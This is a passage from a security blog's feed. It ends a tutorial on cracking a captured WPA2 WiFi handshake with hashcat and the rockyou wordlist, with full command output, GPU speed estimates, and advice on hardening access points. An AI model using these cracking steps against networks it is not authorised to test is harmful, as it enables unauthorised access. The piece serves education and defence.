+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s4lv4ti0n:~$ wc -l rockyou.txt
+14344391 rockyou.txt
+s4lv4ti0n:~$ grep -E '^.{8,}$' rockyou.txt &amp;gt; rockyou_eightplus.txt
+s4lv4ti0n:~$ wc -l rockyou_eightplus.txt
+9607061 rockyou_eightplus.txt
+s4lv4ti0n:~$ grep 'router' rockyou_eightplus.txt
+router01
+sprouter1
+router418
+router27
+trouters1
+trouter5
+routersmodems
+router9698
+router89
+router30
+router2000
+router174
+router123
+router12
+modemrouter1
+s4lv4ti0n:~$ echo 'testrouter' &amp;gt;&amp;gt; rockyou_eightplus.txt
+s4lv4ti0n:~$ grep 'testrouter' rockyou_eightplus.txt
+testrouter
+s4lv4ti0n:~$ wc -l rockyou_eightplus.txt
+9607062 rockyou_eightplus.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dictionary attack is started with command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat -a 0 -m 2500 whhashcat.hccapx rockyou_eightplus.txt&lt;/code&gt;. This time the attack mode &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-a 0&lt;/code&gt; is used which means the dictionary attack should be performed and the mode &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-m 2500&lt;/code&gt; is used which means WPA-EAPOL-PBKDF2 handshake is being cracked. First input file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whhashcat.hccapx&lt;/code&gt; is the extracted handshake and the second input file is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rockyou&lt;/code&gt; dictionary.&lt;/p&gt;
+
+&lt;p&gt;About 15k hashes are calculated per second and 9607062 key candidates are tried in 11 minutes. Because the actual password is appended to the end of the dictionary, all password candidates are checked.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s4lv4ti0n:~$ hashcat -a 0 -m 2500 whhashcat.hccapx rockyou_eightplus.txt
+hashcat (v6.1.1) starting...
+
+OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i7-9850H CPU @ 2.60GHz, 13684/13748 MB (4096 MB allocatable), 12MCU
+
+Minimum password length supported by kernel: 8
+Maximum password length supported by kernel: 63
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Slow-Hash-SIMD-LOOP
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 67 MB
+
+Dictionary cache built:
+* Filename..: rockyou_eightplus.txt
+* Passwords.: 9607062
+* Bytes.....: 104536410
+* Keyspace..: 9607055
+* Runtime...: 1 sec
+
+Approaching final keyspace - workload adjusted.
+
+dc537cde771c:2e9bdf242c40:wifi-home:testrouter
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: WPA-EAPOL-PBKDF2
+Hash.Target......: wifi-home (AP:fc:21:d0:f6:55:1a STA:cf:12:0d:6f:55:a1)
+Time.Started.....: Wed Mar 31 10:36:22 2021 (11 mins, 4 secs)
+Time.Estimated...: Wed Mar 31 10:47:26 2021 (0 secs)
+Guess.Base.......: File (rockyou_eightplus.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    14459 H/s (11.65ms) @ Accel:1024 Loops:64 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 9607055/9607055 (100.00%)
+Rejected.........: 934/9607055 (0.01%)
+Restore.Point....: 9597859/9607055 (99.90%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: #1rocksuperstar -&amp;gt; testrouter
+
+Started: Wed Mar 31 10:36:20 2021
+Stopped: Wed Mar 31 10:47:27 2021
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;Catching a WPA2 handshake and cracking it is quite a straightforward procedure. As shown in this article, no additional equipment is needed. However, investing into some dedicated equipment does increase the sniffer’s range and password cracking speed greatly.&lt;/p&gt;
+
+&lt;p&gt;To extend the sniffer’s range, an external wireless network card with longer antennas can be used. For even more range, the antenna should be mounted somewhere high, where there are no obstacles. I regularly use Alfa Networks AWUS036ACH which comes with 2 antennas for 2.4GHz and 5GHz dual band and supports 802.11a/b/g/n/ac standards. I’ve tested it and it works great.&lt;/p&gt;
+
+&lt;p&gt;To crack passwords fast, bigger budget is needed. Password cracking speed mainly depends on computational power; typically graphic accelerators (cards) are utilized and scaled horizontally. As shown in &lt;a href=&quot;https://gist.github.com/Chick3nman/e4fcee00cb6d82874dace72106d73fef&quot;&gt;Chick3nman&lt;/a&gt;’s benchmark, the GeForce RTX 3090 24GB, which currently sells for about 2700 EUR, can compute 1140k hashes per second for hashcat’s mode 2500. This is about 80 times faster that the CPU used in this experiment. Utilizing 10 of these in parallel would manage about 11000k hashes per second, which is about 800 times faster than the used CPU.&lt;/p&gt;
+
+&lt;h3 id=&quot;protecting-your-wifi-access-point&quot;&gt;Protecting your WiFi access point.&lt;/h3&gt;
+&lt;p&gt;To harden your WiFi network against these attacks&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Use random ESSID&lt;/strong&gt; or at least not a common one. It is possible to buy precomputed dictionaries for common ESSID names. As shown in &lt;a href=&quot;/hacking/hack-wifi-access-points-with-aircrack-ng#wpa2&quot;&gt;WPA2 chapter&lt;/a&gt;, ESSIDs are used as salt in PBKDF2 key derivation function, thus precomputation is possible.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Choose a strong password&lt;/strong&gt; which is at least 13 characters long and contains lowercase and uppercase characters, numbers and special symbols. Common or easily guessable words should not be used as passwords.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Use passwords not found in dictionaries&lt;/strong&gt; as shown in this experiment, passwords found in dictionaries are easily broken. Pick rare passwords.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Use other security measures&lt;/strong&gt; - some access points offer the possibility to go into locked mode in which new devices can’t connect to the network even with valid password.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;the-push-for-wpa3-dragonfly-handshake&quot;&gt;The Push for WPA3 Dragonfly Handshake&lt;/h3&gt;
+&lt;p&gt;The successor of WPA2 was released in 2018: the WPA3 Dragonfly Handshake. Despite the fancy name, it was already broken the next year in the &lt;a href=&quot;https://wpa3.mathyvanhoef.com/&quot;&gt;Dragonblood&lt;/a&gt; paper published by Mathy Vanhoef and Eyal Ronen.&lt;/p&gt;
+
+&lt;p&gt;Fresh new security related protocols are always a bit risky to use since they haven’t been thoroughly tested by many experts. Time is still needed for the WPA3 technology to mature. In addition, replacing all hardware devices currently utilizing WPA2 is expensive and not possible to do fast. The technology transition happens slowly. It seems that the WPA2 is still going to be around for some years.&lt;/p&gt;</content><author><name>Tomi Jerenko</name><email>jerenkotomi@gmail.com</email></author><category term="hacking" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://hackingfordevs.com/assets/images/how-to-hack-wifi-access-points/alfa_kali.jpeg" /><media:content medium="image" url="https://hackingfordevs.com/assets/images/how-to-hack-wifi-access-points/alfa_kali.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
